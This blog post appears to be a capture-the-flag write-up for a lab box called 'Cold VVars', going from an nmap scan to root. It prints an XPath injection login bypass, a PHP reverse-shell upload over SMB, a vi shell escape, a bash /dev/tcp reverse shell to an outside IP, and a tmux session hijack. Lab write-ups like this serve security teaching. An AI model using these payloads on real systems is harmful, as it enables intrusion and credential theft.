---
date: 2021-04-19 15:51:07
layout: post
title: "Cold VVars"
subtitle:
description:
image: /writeup/assets/img/coldvvars/war.jpg
optimized_image:
category:
tags:
author:
paginate: false
---

Starting with nmap scan shows 4 ports open
```bash
nmap -T4 -p- -A 10.10.29.88

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 21:09 IST
Nmap scan report for 10.10.29.88
Host is up (0.42s latency).

PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host: INCOGNITO

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-04-19T15:39:28+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-19T15:39:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.62 seconds
```

Two websites running on port 8080 and 8082.
Fuzzed the websites and found /login on 8082 and /dev on 8080.

![placeholder](/writeup/assets/img/coldvvars/login.png "Login")

The login portal is vulnerable to XPath Injection and gave out all the login details using 
`" or 1=1 or "` in the username field.
![placeholder](/writeup/assets/img/coldvvars/details.png "Details")

Used all the login creds on smb port and found that ArthurMorgan account details work.


Inside the smb share "SECURED" found a note.txt which contains same content as the one at port `http://10.10.29.88:8080/dev/note.txt`.
This means this share is directly connected to the website's dev directory. 
![placeholder](/writeup/assets/img/coldvvars/smb.png "smb") 

Upload PHP reverse shell and get www-data shell into the machine.
Make the shell better by `python3 -c 'import pty;pty.spawn("/bin/bash")'` and then switch user to ArthurMorgan using same password as earlier.
![placeholder](/writeup/assets/img/coldvvars/shell.png "Better")

As the name of box suggests something about vars, so run command **env**.
![placeholder](/writeup/assets/img/coldvvars/vars.png "Vars")
There is one peculiar variable name **OPEN_PORT=4545**.


Open the port using nc and recieve a connection with some options to choose like a program connected to the port.
![placeholder](/writeup/assets/img/coldvvars/program.png "Program")

The 4th option of the program opens a vi terminal and that can be turned into shell by passing commands
```bash
:set shell=/bin/sh
:shell
```

The new shell is of marston user and kinda glitchy. Get a reverse shell using `bash -c 'bash -i >& /dev/tcp/10.4.14.69/8888 0>&1'`.
Make the shell better as done earlier and try to connect to opened tmux session. It fails to open with error *Not a Terminal*.


Use command `export TERM=xterm`

Now again attach to the tmux session
`tmux attach-session -t 0`
Keep exiting the screens untill a root shell appears
![placeholder](/writeup/assets/img/coldvvars/root.png "root")
